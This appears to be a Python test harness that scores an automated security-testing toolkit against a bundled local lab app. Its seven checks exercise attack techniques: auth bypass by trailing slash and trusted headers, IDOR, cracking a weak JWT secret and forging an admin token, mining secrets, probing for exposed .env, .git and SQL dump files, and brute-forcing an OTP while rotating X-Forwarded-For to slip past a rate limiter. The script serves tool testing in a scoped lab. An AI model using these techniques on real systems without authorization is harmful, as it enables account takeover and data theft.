#!/usr/bin/env python3
"""Score the auth capability against the bundled lab — no model, no API key.

Seven checks, one per capability the skill claims. Each drives the real tool
through the real registry (scope, rate limit, evidence, redaction all active)
and asserts on what came back. Exit 0 only when every check passes.

    PYTHONPATH=src python lab/verify_auth_capability.py          # all checks
    PYTHONPATH=src python lab/verify_auth_capability.py A4       # one check

This exists because "the tool is written" is not the same as "the tool works".
Run it after any change to tools/auth.py, and re-run it after an upstream pull.
"""

from __future__ import annotations

import hashlib
import json
import sys
import tempfile
import threading
from http.server import ThreadingHTTPServer
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO))
sys.path.insert(0, str(REPO / "src"))
sys.path.insert(0, str(REPO / "lab"))

import lab_app  # noqa: E402

from aria_x.config import AriaXConfig, SandboxConfig, ScopeConfig  # noqa: E402
from aria_x.events import EventBus  # noqa: E402
from aria_x.models import Project  # noqa: E402
from aria_x.store import Store  # noqa: E402
from aria_x.tools.base import ToolContext  # noqa: E402
from aria_x.tools.builtin import build_registry  # noqa: E402
from aria_x.tools.sandbox import MockSandbox  # noqa: E402
from aria_x.tools.scope import Scope  # noqa: E402

CHECKS: list[tuple[str, str]] = []


def check(code: str, title: str):
    def wrap(fn):
        CHECKS.append((code, title))
        setattr(fn, "_code", code)
        return fn
    return wrap


def ok(condition: bool, message: str) -> None:
    if not condition:
        raise AssertionError(message)


class Harness:
    def __init__(self) -> None:
        lab_app.build_fixtures()
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), lab_app.Handler)
        self.port = self.server.server_address[1]
        self.base = f"http://127.0.0.1:{self.port}"
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.tmp = tempfile.TemporaryDirectory()
        self.workdir = Path(self.tmp.name)
        cfg = AriaXConfig()
        cfg.scope = ScopeConfig(authorized=True, targets=["127.0.0.1"], allow_loopback=True,
                                allow_private=True, max_rps=2000.0)
        cfg.sandbox = SandboxConfig(backend="mock", timeout=5, max_output=4000)
        project = Project.new("verify", "Score the auth capability")
        self.store = Store(":memory:")
        self.store.create_project(project)
        self.ctx = ToolContext(project=project, run_id="verify", task_id="t", agent="verifier",
                               role="worker", store=self.store, config=cfg, events=EventBus(),
                               scope=Scope(cfg.scope), sandbox=MockSandbox(cfg.sandbox, self.workdir),
                               workdir=self.workdir)
        self.registry = build_registry(self.ctx)
        lab_app.ATTEMPTS.clear()
        lab_app.SESSIONS.clear()

    def tool(self, tool_name: str, **args):
        result = self.registry.execute(tool_name, args, self.ctx)
        ok(result.ok, f"{tool_name} failed: {result.error}")
        return result

    def close(self) -> None:
        self.store.close()
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)
        self.tmp.cleanup()


# ---------------------------------------------------------------------------
# checks
# ---------------------------------------------------------------------------


@check("A1", "auth presence: differential finds the slash bypass on /admin")
def a1(h: Harness) -> str:
    result = h.tool("http_matrix", url=f"{h.base}/admin", family="auth_presence")
    rows = {row["label"]: row for row in result.data["matrix"]}
    ok(rows["baseline"]["status"] == 302, f"baseline expected 302, got {rows['baseline']['status']}")
    row = rows["path_trailing_slash"]
    ok(row["status"] == 200, f"bypass expected 200, got {row['status']}")
    ok(row["verdict"] == "DIFF", "bypass not flagged as a differential")
    return f"{len(result.data['matrix'])} variants, {result.data['differing']} differ, /admin/ -> 200"


@check("A2", "session continuity: login, then read another user's object (IDOR)")
def a2(h: Harness) -> str:
    h.tool("http_session", action="open", name="alice", url=f"{h.base}/login", method="POST",
           body="username=alice&password=alicepw1")
    own = h.tool("http_session", action="send", name="alice", url=f"{h.base}/account/1")
    ok(own.data["response"]["status"] == 200, "authenticated read failed")
    other = h.tool("http_session", action="send", name="alice", url=f"{h.base}/account/2")
    ok(other.data["response"]["status"] == 200, "second object unreadable")
    ok("bob" in other.data["response"]["excerpt"], "object 2 is not bob: not an IDOR")
    return "cookie jar held the session; /account/2 readable as alice"


@check("A3", "header trust: X-Forwarded-For / X-Original-URL bypass the admin API")
def a3(h: Harness) -> str:
    result = h.tool("http_matrix", url=f"{h.base}/api/admin/users", family="header_trust")
    rows = {row["label"]: row for row in result.data["matrix"]}
    ok(rows["baseline"]["status"] == 401, f"baseline expected 401, got {rows['baseline']['status']}")
    ok(rows["xff_loopback"]["status"] == 200, "X-Forwarded-For was not trusted")
    ok(rows["original_url_root"]["status"] == 200, "X-Original-URL was not trusted")
    return "two trust headers accepted as loopback"


@check("A4", "JWT: crack the weak secret, forge an admin claim, have the app accept it")
def a4(h: Harness) -> str:
    token = json.loads(h.tool("http_request", url=f"{h.base}/api/token?user=alice")
                       .data["body_excerpt"])["token"]
    inspected = h.tool("jwt_inspect", token=token, crack=True)
    ok(inspected.data["cracked_secret"] == "secret", "secret not cracked")
    forged = h.tool("jwt_inspect", token=token, secret="secret",
                    forge={"claims": {"sub": "alice", "role": "admin"}})
    me = h.tool("http_request", url=f"{h.base}/api/me",
                headers={"Authorization": f"Bearer {forged.data['forged']}"})
    ok(me.data["status"] == 200, "forged token rejected")
    ok('"admin"' in me.data["body_excerpt"], "forged claim not reflected")
    return "HS256 secret 'secret' cracked and re-forged with role=admin"


@check("A5", "route mining: endpoints, secrets and source-map sources out of the bundle")
def a5(h: Harness) -> str:
    result = h.tool("route_mine", url=f"{h.base}/")
    inventory = result.data["inventory"]
    ok("/api/v1/" in inventory["paths"], "API root not mined")
    ok(any("stripe" in s for s in inventory["secrets"]), "no secret shape found")
    ok("src/config.ts" in inventory["paths"], "source map sources not recovered")
    return f"{len(inventory['paths'])} paths, {len(inventory['secrets'])} secrets, sources recovered"


@check("A6", "artifact recovery: .git, .env and a SQL dump, each hashed into evidence")
def a6(h: Harness) -> str:
    result = h.tool("artifact_probe", base_url=h.base, tier="s,m")
    verdicts = {row["path"]: row for row in result.data["rows"]}
    for path, sniff in ((".env", "env-file"), (".git/config", "git-config"),
                        ("backup.sql", "sql-dump")):
        ok(verdicts[path]["verdict"] == "HIT", f"{path} not served: {verdicts[path]['verdict']}")
        ok(verdicts[path]["sniff"] == sniff, f"{path} sniffed as {verdicts[path]['sniff']}")
        evidence = h.workdir / verdicts[path]["evidence_path"]
        ok(evidence.exists(), f"no evidence file for {path}")
        ok(verdicts["graphql"]["verdict"] == "SOFT404", "soft-404 not recognised")
    return "3 artifacts kept with evidence, soft-404 handled"


@check("A7", "code recovery: 2-digit OTP found through a per-IP limiter")
def a7(h: Harness) -> str:
    result = h.tool("code_probe", url=f"{h.base}/otp/{{}}", length=2, max_attempts=100,
                    match=r'"ok": ?true', xff_rotate=True)
    ok([row["code"] for row in result.data["found"]] == ["42"],
       f"code not found: {result.data['found']}")
    return f"code 42 after {result.data['attempts']} attempts at {result.data['rate_per_s']}/s"


def main(argv: list[str]) -> int:
    wanted = {a.upper() for a in argv if not a.startswith("-")}
    harness = Harness()
    failures = 0
    try:
        for code, title in CHECKS:
            if wanted and code not in wanted:
                continue
            try:
                detail = next(fn for fn in globals().values()
                              if getattr(fn, "_code", "") == code)(harness)
                print(f"PASS {code}  {title}\n        {detail}")
            except AssertionError as exc:
                failures += 1
                print(f"FAIL {code}  {title}\n        {exc}")
    finally:
        harness.close()
    total = len([c for c, _ in CHECKS if not wanted or c in wanted])
    print(f"\n{total - failures}/{total} checks passed")
    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
